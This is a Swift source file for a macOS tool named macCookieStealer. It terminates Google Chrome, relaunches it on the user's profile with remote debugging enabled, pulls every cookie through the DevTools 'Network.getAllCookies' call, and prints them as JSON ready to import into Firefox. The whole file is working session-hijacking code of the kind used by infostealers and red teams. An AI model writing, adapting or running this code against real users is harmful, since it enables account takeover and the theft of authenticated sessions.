//
//  main.swift
//  macCookieStealer
//

import Foundation
import AppKit

// stop
var workspace = NSWorkspace.shared
var applications = workspace.runningApplications

for application in applications {
    if application.executableURL!.absoluteString.removingPercentEncoding!.contains("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome") {
        print("[+] Google Chrome process was found.")
        print("[!] Trying to terminate Google Chrome....")
        
        if application.terminate() {
            print("[+] Google Chrome terminated successfully.")
        } else {
            print("[-] Google Chrome could not terminate.")
            print("[!] Forcing Google Chrome to terminate....")
            
            if application.forceTerminate() {
                print("[+] Google Chrome was forced to terminate.")
            } else {
                print("[-] Google Chrome could not terminate again.")
                print("[-] exiting....")
                exit(0)
            }
        }
    }
}
print("")

// debug mode
let chromeBinary = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
let homeDir = NSHomeDirectory()
let userDataDir = homeDir + "/Library/Application Support/Google/Chrome"

let task = Process()
let pipe = Pipe()
task.executableURL = URL(fileURLWithPath: chromeBinary)
task.arguments = [
    "--user-data-dir=" + userDataDir,
    "--remote-debugging-port=9222",
    "--crash-dumps-dir=" + userDataDir,
    "--restore-last-session",
]
task.standardOutput = pipe
task.standardError = pipe
try task.run()
print("[+] Google Chrome restarted in debug mode.")

workspace = NSWorkspace.shared
applications = workspace.runningApplications

for application in applications {
    if application.executableURL!.absoluteString.removingPercentEncoding!.contains("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome") {
        print("[!] the debug mode process was found:")
        print("[!] command: " + application.executableURL!.absoluteString)
    }
}

print("")
sleep(3)

var semaphore = DispatchSemaphore(value: 0)

var webSocketUrl = ""
var request = URLRequest(url: URL(string: "http://127.0.0.1:9222/json")!)
let reqquestTask = URLSession.shared.dataTask(with: request) { (data, response, error) in
    guard let data = data else { return }
    do {
        let objectArray = try JSONSerialization.jsonObject(with: data, options: JSONSerialization.ReadingOptions.allowFragments) as! [Any]
        let object = objectArray.map { (object) -> [String: String] in
            return object as! [String: String]
        }
        webSocketUrl = object[0]["webSocketDebuggerUrl"]!
        
        semaphore.signal()
    } catch let error {
        print(error)
    }
}
reqquestTask.resume()
semaphore.wait()
print("[+] webSocketDebuggerUrl: " + webSocketUrl)

class WebSocket: NSObject, URLSessionWebSocketDelegate {
    
    func urlSession(_ session: URLSession, webSocketTask: URLSessionWebSocketTask, didOpenWithProtocol protocol: String?) {
        print("[+] connected.")
    }
    
    func urlSession(_ session: URLSession, webSocketTask: URLSessionWebSocketTask, didCloseWith closeCode: URLSessionWebSocketTask.CloseCode, reason: Data?) {
        print("[!] disconnected.")
    }
}

func close() {
    let reason = "Closing connection".data(using: .utf8)
    webSocketTask.cancel(with: .goingAway, reason: reason)
    semaphore.signal()
}

func send() {
    DispatchQueue.global().asyncAfter(deadline: .now() + 1) {
        send()
        webSocketTask.send(.string("{\"id\": 1, \"method\": \"Network.getAllCookies\"}")) { error in
            if let error = error {
                print("Error when sending a message \(error)")
            }
        }
        semaphore.signal()
    }
}

var response = ""
func receive() {
    webSocketTask.receive { result in
        switch result {
        case .success(let message):
            switch message {
            case .data(let data):
                print("Data received \(data)")
            case .string(let text):
                response = text
            @unknown default:
                fatalError()
          }
        case .failure(let error):
            print("Error when receiving \(error)")
        }
    semaphore.signal()
    }
}

let webSocketDelegate = WebSocket()
let session = URLSession(configuration: .default, delegate: webSocketDelegate, delegateQueue: OperationQueue())
let url = URL(string: webSocketUrl)!
let webSocketTask = session.webSocketTask(with: url)
webSocketTask.resume()

semaphore = DispatchSemaphore(value: 0)
send()
semaphore.wait()

semaphore = DispatchSemaphore(value: 0)
receive()
semaphore.wait()

semaphore = DispatchSemaphore(value: 0)
close()
semaphore.wait()

struct Cookie: Codable {
    let name: String
    let value: String
    let domain: String
    let path: String
    let expires: Double
    let size: Int
    let httpOnly: Bool
    let secure: Bool
    let session: Bool
    let sameSite: String
    let priority: String
    let sameParty: Bool
    let sourceScheme: String
    let sourcePort: Int
}

struct ManagerCookie: Codable {
    var pathRaw: String
    var hostRaw: String
    var expiresRaw: String
    var contentRaw: String
    var nameRaw: String
    var sameSiteRaw: String
    var thisDomainOnlyRaw: String
    var storeRaw: String
    var firstPartyDomain: String
    
    private enum CodingKeys : String, CodingKey {
        case pathRaw = "Path raw"
        case hostRaw = "Host raw"
        case expiresRaw = "Expires raw"
        case contentRaw = "Content raw"
        case nameRaw = "Name raw"
        case sameSiteRaw = "SameSite raw"
        case thisDomainOnlyRaw = "This domain only raw"
        case storeRaw = "Store raw"
        case firstPartyDomain = "First Party Domain"
    }
    
    var json: Data? {
        return try? JSONEncoder().encode(self)
    }
}

var responseData: Data =  response.data(using: String.Encoding.utf8)!
let responseJson = try JSONSerialization.jsonObject(with: responseData) as! Dictionary<String, Any>
let resultData = responseJson["result"] as! NSDictionary
let cookieArray = resultData["cookies"] as! NSArray

var managerCookieArray = [ManagerCookie]()
cookieArray.forEach{ cookie in
    let cookieDict = cookie as! NSDictionary
    managerCookieArray.append(
        ManagerCookie(
            pathRaw: "/",
            hostRaw: "http://" + (cookieDict["domain"] as! String) + "/",
            expiresRaw: String(cookieDict["expires"] as! Double),
            contentRaw: cookieDict["value"] as! String,
            nameRaw: cookieDict["name"] as! String,
            sameSiteRaw: "no_restriction",
            thisDomainOnlyRaw: "false",
            storeRaw: "firefox-default",
            firstPartyDomain: ""
        )
    )
}

print("[+] import the following json to Firefox with CookieQuickManager")
let managerCookieData = try? JSONEncoder().encode(managerCookieArray)
let managerCookieString = String(data: managerCookieData!, encoding: .utf8)
print(managerCookieString!)
